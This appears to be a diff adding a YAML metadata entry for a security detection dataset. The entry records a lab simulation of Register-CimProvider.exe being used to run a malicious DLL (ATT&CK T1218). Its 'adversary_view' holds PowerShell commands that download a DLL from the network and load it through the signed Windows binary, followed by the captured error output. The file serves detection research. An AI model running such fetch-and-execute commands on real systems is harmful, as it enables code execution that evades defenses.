@@ -1,0 +1,37 @@
+title: Register-CimProvider Execute Dll
+id: SDWIN-201023020513
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/23
+modification_date: 2020/10/23
+platform: Windows
+tags:
+description: This dataset represents threat actors leveraging Register-Cimprovider to execute a malicious Dll.
+attack_mappings:
+  - technique: T1218
+    sub-technique:
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/psh_register_cimprovider_execute_dll.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    PS >Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile C:\ProgramData\T1218-2.dll
+    PS > C:\Windows\SysWow64\Register-CimProvider.exe -Path C:\ProgramData\T1218-2.dll
+    
+    'Namespace' is not specified.
+    'ProviderName' is not specified.
+    Failed to load provider 'C:\ProgramData\T1218-2.dll'. Failure code 0x8007045A.
+    
+    Try 'Register-CimProvider.exe -help' for help.
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-3---register-cimprovider---execute-evil-dll
